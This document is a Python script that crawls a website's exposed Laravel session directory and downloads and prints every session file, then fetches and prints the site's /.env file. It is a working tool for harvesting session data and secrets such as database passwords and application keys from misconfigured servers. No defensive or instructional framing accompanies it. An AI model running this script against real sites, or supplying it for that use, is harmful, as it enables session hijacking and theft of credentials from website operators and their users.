import os
import requests
from bs4 import BeautifulSoup
import urllib.parse
from datetime import datetime


# Replace with the URL you want to scrape
base_url = "http://example.com"
env_file_path = "/.env"
url = base_url+"/storage/framework/sessions/"

# Send an HTTP GET request to the URL
response = requests.get(url)

# Check if the request was successful
if response.status_code == 200:
    # Parse the HTML content of the page
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all anchor (a) tags with href attributes
    links = soup.find_all('a', href=True)

    # Create a list to store file URLs and their contents
    file_data = []

    for link in links:
        href = link.get('href')
        # Check if the URL is relative or absolute
        if href.startswith('http'):
            file_url = href
        else:
            file_url = urllib.parse.urljoin(url, href)
        
        # Send a GET request to the file URL to fetch its contents
        file_response = requests.get(file_url)

        if file_response.status_code == 200:
            file_content = file_response.text
            # Skip if the file_content contains <html> tag
            if '<html>' not in file_content:
                # Get the last modified time of the local file (if available)
                local_file_path = os.path.join("path/to/local/session/files", os.path.basename(urllib.parse.urlparse(file_url).path))
                last_modified = "N/A"
                if os.path.exists(local_file_path):
                    last_modified_timestamp = os.path.getmtime(local_file_path)
                    last_modified = datetime.utcfromtimestamp(last_modified_timestamp).strftime('%Y-%m-%d %H:%M:%S')
                    
                file_data.append({
                    'file_url': file_url,
                    'file_content': file_content,
                    'last_modified': last_modified
                })
                
            else:
                print(f"Skipping {file_url} due to <html> tag.")
        else:
            print(f"Failed to fetch content from {file_url}")

    # Print or process the file data as needed
    for item in file_data:
        print(f"File URL: {item['file_url']}")
        print(f"Last Modified: {item['last_modified']}")
        print(f"File Content: {item['file_content']}\n")
        # Print separator line
        print("=" * 100)
else:
    print(f"Failed to retrieve data from {url}")

# Function to extract .env file content
def extract_env_info(url):
    env_url = urllib.parse.urljoin(url, env_file_path)
    env_response = requests.get(env_url)

    if env_response.status_code == 200:
        env_content = env_response.text
        return env_content
    else:
        print(f"Failed to fetch .env content from {env_url}")
        return None
env_info = extract_env_info(base_url)
if env_info:
    print("Environment (.env) Information:")
    print(f"File Content: {env_info}")
